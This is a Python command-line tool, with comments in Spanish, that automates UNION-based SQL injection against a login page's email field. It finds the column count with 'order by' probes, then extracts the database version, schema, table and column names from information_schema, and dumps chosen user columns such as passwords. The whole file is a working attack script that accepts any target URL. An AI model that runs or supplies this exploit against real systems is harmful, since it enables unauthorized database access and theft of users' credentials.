import requests
import sys
import argparse

def make_request(url: str, content_length: int) -> int:
    for x in range(100, 0, -1):
        ress = requests.post(url=url, data={"email": f"test@test.com ' order by {x}-- -", "password": "test"})
        if len(ress.text) != content_length:
            print("The number of columns inside the table:", x)
            return x
    return 0

def make_sqli(url: str, num_columns: int, keyword: str):
    column_placeholders = ','.join(str(i) for i in range(1, num_columns))
    
    validid_email = "test@test.com"
    # Obtener la versión de la base de datos
    data = {"email": f"{validid_email}' union select {column_placeholders},@@version-- -", "password": "test"}
    response = requests.post(url=url, data=data)
    print(find_and_print(response.text.strip(), keyword))
    
    # Obtener los nombres de las bases de datos
    data = {"email": f"{validid_email}' union select {column_placeholders},schema_name from information_schema.schemata-- -", "password": "test"}
    response = requests.post(url=url, data=data)
    print(find_and_print(response.text.strip(), keyword))
    
    # Obtener los nombres de las tablas en una base de datos específica
    table_schema = input("Introduce el nombre del esquema de tabla ('main' por ejemplo): ")
    data = {"email": f"{validid_email}' union select {column_placeholders},table_name from information_schema.tables where table_schema='{table_schema}'-- -", "password": "test"}
    response = requests.post(url=url, data=data)
    print(find_and_print(response.text.strip(), keyword))
    
    # Obtener los nombres de las columnas de una tabla específica ('user' en este caso)
    table_name = input("Introduce el nombre de la tabla ('user' por ejemplo): ")
    data = {"email": f"{validid_email}' union select {column_placeholders},column_name from information_schema.columns where table_name='{table_name}'-- -", "password": "test"}
    response = requests.post(url=url, data=data)
    print(find_and_print(response.text.strip(), keyword))

    columns = input("Ingresa las columnas de 'user' separadas por comas (por ejemplo: id, name, password, email): ")
    columns_list = [col.strip() for col in columns.split(',')]
    
    sql_query = f"{validid_email}' union select {column_placeholders},group_concat({','.join(columns_list)}) from {table_name}-- -"
    data = {"email": sql_query, "password": "test"}
    response = requests.post(url=url, data=data)
    print(find_and_print(response.text.strip(), keyword))

def find_and_print(text: str, marker: str) -> str:
    if marker:
        start = text.find(marker)
        if start != -1:
            start += len(marker)
            end = text.find('<', start)
            if end == -1:
                end = len(text)
            return text[start:end].strip()
        else:
            print(f"Keyword '{marker}' not found in the response.")
    else:
        print("No keyword provided, printing the entire response.")
    return text  # Return the entire text if the marker is not specified or not found

def main():
    
    parser = argparse.ArgumentParser(
        description="SQL Injection tool",
        epilog="Example: python s9.py http://example.com/login --content-length 33490 --keyword Welcome\n\n"
               "To determine the content length, monitor the length of the response body when making a normal login request."
    )
    parser.add_argument("url", help="URL of the login page")
    parser.add_argument(
        "--content-length",
        type=int,
        default=33490,
        help="Expected content length for comparison. "
             "You can find this by observing the length of the response body for a normal login attempt."
    )
    parser.add_argument(
        "--keyword",
        type=str,
        default="",
        help="Keyword to filter the response content. If not specified, the entire HTML will be printed."
    )
    args = parser.parse_args()

    try:
        url = args.url
        content_length = args.content_length
        keyword = args.keyword
        
        num_columns = make_request(url, content_length)
        
        if num_columns:
            make_sqli(url, num_columns, keyword)
        else:
            print("Failed to determine the number of columns.")
    except Exception as e:
        print(str(e))
        sys.exit(1)

if __name__ == "__main__":
    main()
